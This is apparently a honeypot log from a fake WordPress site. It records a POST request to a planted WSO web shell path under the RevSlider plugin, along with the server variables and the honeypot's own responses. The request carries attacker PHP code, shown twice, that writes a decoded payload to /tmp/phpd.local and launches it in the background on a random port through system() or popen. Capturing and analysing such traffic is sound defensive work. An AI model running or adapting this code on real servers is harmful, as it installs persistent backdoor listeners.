
_SERVER
Array
(
    [UNIQUE_ID] => WhXxL9VetVmI7bWMt89GZQAAAAE
    [SCRIPT_URL] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_URI] => http://www.stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [HTTP_HOST] => www.stratigery.com
    [HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
    [HTTP_ACCEPT] => */*
    [HTTP_CACHE_CONTROL] => no-cache
    [CONTENT_LENGTH] => 871847
    [CONTENT_TYPE] => application/x-www-form-urlencoded
    [HTTP_EXPECT] => 100-continue
    [PATH] => /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
    [SERVER_SIGNATURE] => 
    [SERVER_SOFTWARE] => Apache/2.4.29 (Unix) PHP/7.1.12
    [SERVER_NAME] => www.stratigery.com
    [SERVER_ADDR] => 162.246.45.144
    [SERVER_PORT] => 80
    [REMOTE_ADDR] => 212.129.14.102
    [DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [REQUEST_SCHEME] => http
    [CONTEXT_PREFIX] => 
    [CONTEXT_DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [SERVER_ADMIN] => bediger@stratigery.com
    [SCRIPT_FILENAME] => /srv/http/stratigery/htdocs/fake_wp/wso.php
    [REMOTE_PORT] => 43104
    [GATEWAY_INTERFACE] => CGI/1.1
    [SERVER_PROTOCOL] => HTTP/1.1
    [REQUEST_METHOD] => POST
    [QUERY_STRING] => 
    [REQUEST_URI] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_NAME] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [PHP_SELF] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [REQUEST_TIME_FLOAT] => 1511387439.105
    [REQUEST_TIME] => 1511387439
)

_REQUEST
Array
(
    [a] => Php
    [c] => 
    [p1] => $a="";
        if ( !function_exists("system") ){
            echo "system disabled\n";
            exit();
        }
        
        if (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") {
        
            $file_name = "phpd.local";
            if( file_exists($file_name) ){
                copy($file_name, $file_name."_backup");
            }
            file_put_contents($file_name, base64_decode($a));

        } else {
        
            $file_name = "/tmp/phpd.local";
            if( file_exists($file_name) ){
                    copy($file_name, $file_name."_backup");
            }
            if ( !file_put_contents($file_name, base64_decode($a)) ){
                $file_name = "phpd.local";
                if( file_exists($file_name) ){
                    copy($file_name, $file_name."_backup");
                }
                file_put_contents($file_name, base64_decode($a));
            }
	}
	$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	for($i = 0; $i< 25; $i++ ){
		$port = rand(20000, 60000);
		//echo "Trying port:".$port."\n";
		if (socket_bind($sock, "0.0.0.0", $port) === false) {
			echo "error:".  socket_strerror(socket_last_error($sock)) . "\n";
			$i++;
		} else {
			break;
		}
	}
	socket_close($sock);
	//echo "port:$port\n";
	$cmd = "nohup php ".$file_name." *:".$port." >/dev/null 2>&1 &";
        if (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") {
            $cmd = "php ".$file_name." *:".$port." 1 > NUL";
            echo $cmd;
            pclose(popen("start /b " . $cmd, "r"));

        } else {
        
            echo $cmd;
            system($cmd);
        }
	echo "started at port:$port\n";
    [p2] => 
    [p3] => 
    [charset] => UTF-8
    [pass] => nhzgrf
)

_COOKIE
 Array
(
)

_FILES
 
END _FILES
 $my_blog=http://www.stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider
pass parameter, acting as WSO
Acting as WSO, login cookie.
a = Php
c = 
p1 = $a="";
        if ( !function_exists("system") ){
            echo "system disabled\n";
            exit();
        }
        
        if (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") {
        
            $file_name = "phpd.local";
            if( file_exists($file_name) ){
                copy($file_name, $file_name."_backup");
            }
            file_put_contents($file_name, base64_decode($a));

        } else {
        
            $file_name = "/tmp/phpd.local";
            if( file_exists($file_name) ){
                    copy($file_name, $file_name."_backup");
            }
            if ( !file_put_contents($file_name, base64_decode($a)) ){
                $file_name = "phpd.local";
                if( file_exists($file_name) ){
                    copy($file_name, $file_name."_backup");
                }
                file_put_contents($file_name, base64_decode($a));
            }
	}
	$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	for($i = 0; $i< 25; $i++ ){
		$port = rand(20000, 60000);
		//echo "Trying port:".$port."\n";
		if (socket_bind($sock, "0.0.0.0", $port) === false) {
			echo "error:".  socket_strerror(socket_last_error($sock)) . "\n";
			$i++;
		} else {
			break;
		}
	}
	socket_close($sock);
	//echo "port:$port\n";
	$cmd = "nohup php ".$file_name." *:".$port." >/dev/null 2>&1 &";
        if (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") {
            $cmd = "php ".$file_name." *:".$port." 1 > NUL";
            echo $cmd;
            pclose(popen("start /b " . $cmd, "r"));

        } else {
        
            echo $cmd;
            system($cmd);
        }
	echo "started at port:$port\n";
p2 = 
p3 = 
Acting as WSO, send php console.
